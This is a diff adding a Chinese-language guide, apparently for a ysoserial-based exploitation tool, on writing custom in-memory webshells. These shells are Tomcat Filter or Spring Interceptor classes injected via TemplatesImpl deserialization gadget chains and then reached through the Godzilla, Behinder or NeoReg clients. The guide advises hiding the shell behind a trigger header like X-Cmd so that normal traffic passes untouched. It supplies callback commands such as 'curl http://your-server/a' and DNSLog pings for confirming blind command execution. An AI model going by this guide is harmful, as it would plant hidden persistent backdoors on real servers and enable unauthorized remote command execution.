@@ -1,0 +1,175 @@
+═══════════════════════════════════════════════
+  自定义内存马编写指南
+═══════════════════════════════════════════════
+
+【先说结论】
+  - 内置模板优先走 ysoserial 原生 CLASS: 机制，稳定性更高
+  - 自定义内存马走的是 classBytes -> TemplatesImpl -> gadget 链包装
+  - 因此这里只适合视为“部分稳定支持”，不应理解为任意模板全兼容
+  - 当前更推荐 CB / CC2 / CC4 / Shiro 这类已验证链
+
+【必须满足】
+  1. 主类必须能被 TemplatesImpl 正常加载
+  2. 通常建议继承 AbstractTranslet
+  3. 需要提供完整类名（含包名）
+  4. 若存在内部类，需与主类一起提供
+  5. 仅支持导入已编译好的 .class 文件
+
+【按回显/触发类型来理解】
+  A. 直接回显型（BODY_RAW）
+     - 触发后整个响应体就是命令结果
+     - 例如 TomcatCmdEcho 这类最省事
+
+  B. 页面嵌入型（BODY_BOUNDARY / BODY_SUBSTRING / BODY_REGEX）
+     - 结果嵌在 HTML 页面里，不是整页纯文本
+     - 最好自己输出明确标记，便于工具提取
+
+  C. 无回显执行型（NO_ECHO）
+     - 命令执行了，但页面没有结果
+     - 这类必须靠副作用验证，不要误判成失败
+
+  D. 连接型（connect）
+     - 不是工具里的"命令执行回显"按钮去测
+     - 是注入后用哥斯拉/冰蝎/NeoReg 等客户端连
+
+【推荐写法】
+  - 触发逻辑尽量放在 static 块、构造或初始化路径
+  - echo 型请明确：请求方法、触发位置、触发名、触发路径
+  - connect 型请明确 tool / password / key
+  - 若结果嵌在页面里，务必自己输出边界标记或固定前后缀
+  - 若是无回显执行型，说明里要写清楚验证方式
+  - 不要依赖项目外部路径或 IDE 临时编译输出
+
+【工具会帮你做什么】
+  - 支持导入 .class（直接使用）
+  - 自动复制同目录内部类（Foo$1.class）
+  - 将文件复制到项目目录 memshells/classes/
+  - 注入时把 classBytes 塞进 TemplatesImpl，再由 gadget 链触发
+
+【注意事项】
+  - 完整类名不对，注入后容易 ClassNotFoundException
+  - 若类依赖额外第三方包，目标环境缺失时可能加载失败
+  - 若逻辑只写在普通方法里，而没有初始化触发点，注入后可能无效果
+  - connect 型内存马不是用"命令执行回显"按钮测试，而是注入后再用对应客户端连接
+  - 如果是直接访问触发型，尽量避免把结果混在整页 HTML 里不留标记
+  - 如果必须嵌入网页，建议输出：<!--YSO_BEGIN-->结果<!--YSO_END-->
+  - 如果只能无回显执行，建议先用 ping / curl / 写文件 / sleep 这类容易验证的命令调试
+
+【写法建议：让工具更容易适配】
+  1. 触发输入最好固定在单一位置：
+     - Header: X-Cmd
+     - 或 Query: ?cmd=whoami
+     - 或 Body: cmd=whoami
+     不要同一个模板里混多种入口
+
+  2. 输出尽量选下面三种之一：
+     - 纯文本直接输出（最好适配）
+     - 边界包裹输出（次优，但稳定）
+     - 固定标签包裹，如 <pre id='x'>结果</pre>
+
+  3. 如果模板没有直接回显：
+     - 说明里要写：'无回显，靠副作用验证'
+     - 推荐调试命令：ping / nslookup / curl / sleep / touch
+
+  4. 若写 Spring Interceptor / Tomcat Filter：
+     - 先确保注册逻辑幂等，避免重复注入时把链路挂坏
+     - 触发逻辑尽量只在检测到特定 Header/参数时执行
+     - 平时普通请求应尽量透明通过
+
+═══════════════════════════════════════════════
+  示例1：最小 echo 型模板骨架
+═══════════════════════════════════════════════
+
+package com.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class MyEchoShell extends AbstractTranslet {
+    static {
+        try {
+            // 在这里放注册 Filter/Listener/Interceptor 的逻辑
+            // 例如：从线程里取 request/context，再挂回显逻辑
+        } catch (Throwable t) {
+            t.printStackTrace();
+        }
+    }
+
+    public MyEchoShell() {
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+    }
+}
+
+═══════════════════════════════════════════════
+  示例2：页面嵌入回显型（推荐自己打边界）
+═══════════════════════════════════════════════
+
+  // 假设你必须把结果嵌在 HTML 页面里，建议这样输出：
+  out.write("<!--YSO_BEGIN-->");
+  out.write(execResult);
+  out.write("<!--YSO_END-->");
+
+  好处：
+  - 人眼能看出结果在哪
+  - 工具也能按前后缀精确提取
+  - 不会把整页 HTML 错当成命令回显
+
+═══════════════════════════════════════════════
+  示例3：无回显执行型调试方法
+═══════════════════════════════════════════════
+
+  如果模板只执行命令但不输出结果，先不要直接测 whoami。
+  先测这种更容易验证的：
+    ping 127.0.0.1
+    ping your.dnslog.domain
+    curl http://your-server/a
+    timeout /t 5
+
+  这样你能靠：
+  - DNSLog
+  - HTTP 回连
+  - 时间延迟
+  来确认命令其实执行了
+
+═══════════════════════════════════════════════
+  示例4：配置建议（echo 型）
+═══════════════════════════════════════════════
+
+  名称：MyEchoShell
+  类型：Filter / Listener / Servlet / Spring 等按实际填
+  模式：echo
+  适用：Tomcat / Spring
+  触发Header：X-Cmd
+  触发路径：/
+  完整类名：com.example.MyEchoShell
+  描述：GET + Header(X-Cmd) 触发；结果直接回显在 body 中
+
+═══════════════════════════════════════════════
+  示例5：配置建议（connect 型）
+═══════════════════════════════════════════════
+
+  如果你写的是哥斯拉/冰蝎类连接型模板：
+  - 模式填 connect
+  - tool / password / key 要与模板实现保持一致
+  - 注入后请用对应客户端连接，不要拿 echo 测试区验证
+
+═══════════════════════════════════════════════
+  示例6：Spring Interceptor 写法提醒
+═══════════════════════════════════════════════
+
+  如果你写的是 SpringInterceptorMemShell 一类：
+  - 注册时注意从当前上下文拿 HandlerMapping / Context
+  - 触发逻辑建议放在 preHandle
+  - 检测到特定 Header/参数再执行命令
+  - 其他普通请求直接 return true 放行
+  - 最好避免默认对所有请求都改写响应体
